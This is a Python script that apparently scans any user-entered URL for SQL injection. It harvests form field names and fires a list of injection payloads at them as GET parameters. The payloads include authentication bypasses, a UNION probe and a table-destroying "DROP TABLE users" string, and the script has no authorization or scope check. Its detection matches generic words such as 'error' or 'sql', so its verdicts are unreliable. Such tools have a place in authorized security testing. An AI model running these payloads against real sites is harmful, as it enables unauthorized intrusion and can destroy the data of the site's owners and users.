import requests
import re
from bs4 import BeautifulSoup

# List of SQL Injection payloads to test
payloads = [
    "' OR 1=1 --", 
    "' OR 'a'='a", 
    "' UNION SELECT NULL, NULL, NULL --", 
    "' AND 1=2 --", 
    "'; DROP TABLE users --",
    "' OR 'a'='b' --",
    "admin' --", 
    "1' OR '1'='1",
    "1' AND '1'='1"
]

# Common error messages related to SQL Injection
error_messages = [
    "syntax error", 
    "mysql_fetch_assoc", 
    "database", 
    "sql", 
    "warning", 
    "error", 
    "unexpected"
]

# Function to check for SQL injection based on error messages in response text
def check_for_error(response_text):
    for error_message in error_messages:
        if re.search(error_message, response_text, re.IGNORECASE):
            return True
    return False

# Function to test a single URL for SQL Injection vulnerability
def test_url(url, params):
    vulnerable = False
    for param in params:
        for payload in payloads:
            payload_url = f"{url}?{param}={payload}"
            print(f"Testing {payload_url}...")
            try:
                response = requests.get(payload_url)
                if response.status_code == 200:
                    # Check if any SQL error message or abnormal behavior is present
                    if check_for_error(response.text):
                        print(f"Potential SQL Injection detected with payload: {payload}")
                        vulnerable = True
                    # Optionally, you can also check for behavior changes in the response (e.g., timing-based injections)
                else:
                    print(f"Error: {response.status_code}")
            except Exception as e:
                print(f"Error while testing URL: {str(e)}")
    
    if vulnerable:
        print(f"{url} is vulnerable to SQL injection!")
    else:
        print(f"{url} is safe from the tested SQL injection payloads.")

# Function to extract form parameters from a web page
def extract_form_params(url):
    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')
        
        form_params = []
        for form in forms:
            inputs = form.find_all('input')
            for input_tag in inputs:
                name = input_tag.get('name')
                if name:
                    form_params.append(name)
        return form_params
    except Exception as e:
        print(f"Error extracting form params from {url}: {e}")
        return []

# Function to scan a website for SQL Injection vulnerabilities
def scan_website(url):
    print(f"Scanning {url} for SQL injection vulnerabilities...")

    # Extract form parameters from the website
    form_params = extract_form_params(url)
    if form_params:
        print(f"Found form parameters: {', '.join(form_params)}")
        test_url(url, form_params)
    else:
        print("No form parameters found, testing URL-based parameters...")
        # If no forms, test common URL parameters (like ?id=1)
        test_url(url, ['id', 'page', 'item', 'cat', 'search'])
        
    print(f"Finished scanning {url}.")

# Main function
if __name__ == "__main__":
    target_url = input("Enter the URL to scan for SQL injection: ")
    scan_website(target_url)
